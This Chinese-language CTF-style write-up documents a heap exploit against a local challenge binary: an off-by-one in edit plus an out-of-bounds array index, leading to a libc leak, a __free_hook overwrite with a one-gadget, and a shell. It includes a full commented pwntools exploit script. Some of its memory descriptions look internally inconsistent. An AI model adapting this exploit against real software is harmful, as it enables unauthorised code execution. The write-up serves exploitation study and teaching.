# 漏洞利用文档

## 执行环境
基于提供的exp和调试记录，程序运行环境分析如下：
- **二进制类型**：64位ELF程序，动态链接（使用`ldd`类似工具可查看依赖的libc）。
- **保护机制**：从固定地址（如heap数组0x6020e0、len数组0x602060）推断，可能未开启PIE（位置无关执行）；但ASLR可能开启，因为libc地址在运行时动态确定（如main_arena地址0x72c6f6218b78）。exp中使用了`elf.libc`，表明libc版本已知，通常通过泄漏或本地环境匹配。
- **依赖需求**：需要pwn工具链（如pwntools）、对应的libc库，以及调试环境（如gdb、tmux）。程序通过菜单交互，运行在本地进程模式。
- **运行方式**：通过`process('./data/sample1')`启动，依赖标准输入/输出进行交互。

## 漏洞成因
程序是一个堆管理器，关键漏洞源于以下方面：
- **关键结构体**：程序使用全局数组管理堆块：
  - `heap`数组（地址0x6020e0）：存储分配的内存块指针，索引范围0-31（32个元素）。
  - `len`数组（地址0x602060）：存储对应堆块的大小。
  - `key1`（地址0x6022bc）：限制edit操作次数（初始为0，达到2时退出）。
  - `key2`（地址0x6022b8）：控制show操作权限（非零时允许显示）。
- **漏洞位置**：在`ed`函数（编辑功能）中，代码`v2[read(0, v2, (int)len[v1])] = 0;`存在off-by-one错误：
  - 当输入数据长度等于`len[v1]`时，`read`返回该值，并在`v2[len[v1]]`处写入0字节，这超出分配的内存块边界（有效索引为0到`len[v1]-1`），导致堆缓冲区溢出。
  - 溢出可覆盖相邻堆块的元数据（如size字段），破坏堆结构，结合堆分配策略，可能引发Use-After-Free（UAF）或任意内存读写。
- **辅助漏洞**：程序允许使用索引32进行堆操作（如malloc、edit），但heap和len数组只有32个元素（索引0-31），导致数组越界访问，可修改其他全局变量（如key1、key2或heap数组外的内存）。
- **动态调试验证**：调试记录显示，通过edit触发off-by-one溢出后，堆块元数据被覆盖，fd/bk指针指向伪造地址，最终通过覆盖__free_hook实现代码执行。

## 漏洞利用过程
利用过程通过组合off-by-one溢出和数组越界访问，分步骤操纵内存，最终获取shell。关键步骤和内存变化总结如下表：

| 步骤 | 操作 | 关键内存变化 | 目的 |
|------|------|---------------|------|
| 1 | `malloc(0,0xf8,'aaaa')` 等 | 分配4个堆块：块0(0xc37b000)、块1(0xc37b100)、块2(0xc37b200)、块3(0xc37b300)；索引32越界访问heap和len数组，破坏len[15]等 | 初始堆布局，为溢出做准备；利用索引32触发数组越界 |
| 2 | `edit(32,py)` | 覆盖块1元数据：伪造FD=0x6021c8、BK=0x6021d0；修改块2的prev_size=0xf0、清除PREV_INUSE位 | 触发off-by-one溢出，伪造unsorted bin链表，为泄漏libc做准备 |
| 3 | `free(1)` | 块1加入unsorted bin，fd/bk指向main_arena(0x72c6f6218b78)；key1从0变为1（编辑功能禁用） | 泄漏libc基址；权限状态变化 |
| 4 | `edit(32,py)` | 通过数组越界修改heap[256]（0x6021e0）指向free_got(0x601fa0)；破坏len数组 | 设置全局指针指向GOT表，为任意地址读写做准备 |
| 5 | `puts(32)` | 显示索引32内容，泄漏free函数地址；key2变为1（显示功能启用） | 验证libc泄漏，计算onegadget地址 |
| 6 | 计算onegadget和free_hook | 基于泄漏的free_addr计算：onegadget = free_addr - libc.symbols["free"] + 0x4527a, free_hook = free_addr - libc.symbols["free"] + libc.symbols['__free_hook'] | 准备覆盖目标地址 |
| 7 | `edit(31,pay)` | 修改heap[256]指向__free_hook(0x72c6f621a7a8) | 重定向指针至__free_hook，为覆盖做准备 |
| 8 | `edit(32,p64(onegadget))` | 覆盖__free_hook为onegadget地址(0x72c6f5e9927a) | 劫持free函数执行流 |
| 9 | `free(0)` | 触发__free_hook，执行onegadget获取shell；进程切换至/bin/dash | 完成代码执行，获取权限 |
| 10 | `p.interactive()` | 进入交互模式，控制shell | 利用完成 |

**堆布局变化摘要**：
- 初始：连续分配4个大小为0xf8的堆块，元数据size=0x101（含PREV_INUSE位）。
- 步骤2后：块1元数据被覆盖，伪造fd/bk；块2的prev_size和PREV_INUSE位修改，模拟合并状态。
- 步骤3后：块1在unsorted bin中，fd/bk指向main_arena，泄漏libc。
- 步骤4-8：通过数组越界修改全局指针，最终覆盖__free_hook。
- 步骤9后：堆内存被释放，进程执行shell，内存映射完全切换。

## Exploit
以下是完整的漏洞利用脚本（exp），在关键位置添加注释说明：

```python
from pwn import *

# 设置调试环境和上下文
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample1')
p = process('./data/sample1')
libc = elf.libc  # 获取程序使用的libc

# 定义常用函数简化操作
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def edit(index, Content):
    ru("show")
    sl('3')
    ru("index:")
    sl(str(index))
    ru("content:")
    sd(Content)

def free(Index):
    ru("show")
    sl('2')
    ru("index:")
    sl(str(Index))

def malloc(index, size, content):
    ru("show")
    sl('1')
    ru("index:")
    sl(str(index))
    ru("size:")
    sl(str(size))
    ru("content:")
    sd(content)

def puts(index):
    ru("show")
    sl('4')
    ru("index:")
    sl(str(index))

# Step 1: 初始堆布局，分配多个块，利用索引32进行数组越界访问
# 索引32实际访问heap[32]，但数组只有32元素（0-31），导致越界修改len数组和后续内存
malloc(0, 0xf8, 'aaaa')
malloc(32, 0xf8, 'bbbb')  # 关键：使用索引32触发越界
malloc(1, 0xf8, 'cccc')
malloc(31, 0xf8, 'dddd')

# Step 2: 触发off-by-one溢出，伪造堆块元数据为unsorted bin攻击做准备
free_got = elf.got['free']  # 获取free函数的GOT条目地址
ptr = 0x6021E0  # heap数组的偏移位置，用于伪造指针
FD = ptr - 24   # 伪造fd指针，指向heap数组内部
BK = ptr - 16   # 伪造bk指针
py = p64(0) + p64(0xf1) + p64(FD) + p64(BK)  # 伪造chunk头：prev_size=0, size=0xf1（设置伪造大小），fd/bk指向伪造地址
py = py.ljust(0xf0, b"\x00")  # 填充到块的实际用户数据大小（0xf0字节）
py += p64(0xf0)  # 覆盖下一个块（块2）的prev_size，模拟堆合并
edit(32, py)  # 编辑索引32，触发off-by-one溢出，覆盖块1元数据

# Step 3: 释放块1，触发unsorted bin，泄漏libc地址
free(1)  # 释放后，块1的fd/bk被设置为main_arena地址，用于泄漏

# Step 4: 数组越界修改heap指针，指向GOT表，为任意地址读写作准备
py = p64(0x6021E0)*3 + p64(free_got) + b'a'*0xD0 + p64(1)  # 构造payload：覆盖heap数组指针链，最终指向free_got
edit(32, py)  # 再次利用索引32越界访问，修改heap[256]为free_got地址

# Step 5: 使用show功能泄漏free函数地址（需要key2非零，但步骤中key2已被修改）
puts(32)  # 显示索引32内容，输出free_got指向的地址（即free函数实际地址）
free_addr = u64(ru(b"\n1.")[1:7].ljust(8, b'\x00'))  # 解析泄漏的地址（去除非预期字符并对齐）

# Step 6: 计算onegadget和__free_hook地址
onegadget = free_addr - libc.symbols["free"] + 0x4527a  # 计算onegadget偏移（假设libc中onegadget偏移为0x4527a）
free_hook = free_addr - libc.symbols["free"] + libc.symbols['__free_hook']  # 计算__free_hook地址

# Step 7: 修改指针指向__free_hook，为覆盖做准备
pay = p64(free_hook)  # payload：将指针设置为__free_hook地址
pay = pay.ljust(0xf0, b'\x00')  # 填充到块大小
pay += p64(1)  # 可选：设置其他数据
edit(31, pay)  # 编辑索引31，修改指针链

# Step 8: 覆盖__free_hook为onegadget地址，劫持执行流
edit(32, p64(onegadget))  # 通过索引32写入onegadget地址到__free_hook

# Step 9: 触发free执行shell（调用free时执行__free_hook中的onegadget）
free(0)  # 释放任意块（如块0），触发__free_hook

# Step 10: 进入交互模式，控制获取的shell
p.interactive()
```

**注释说明**：
- 利用核心：结合off-by-one溢出和数组越界，先泄漏libc，再覆盖__free_hook实现代码执行。
- 关键技巧：使用索引32越界访问全局数组，修改指针链；伪造堆元数据触发unsorted bin泄漏。
- 依赖条件：需要知道libc版本（通过泄漏或本地环境），以及对应的onegadget偏移。
- 注意事项：exp假设libc中onegadget偏移为0x4527a，实际环境中需根据libc版本调整。
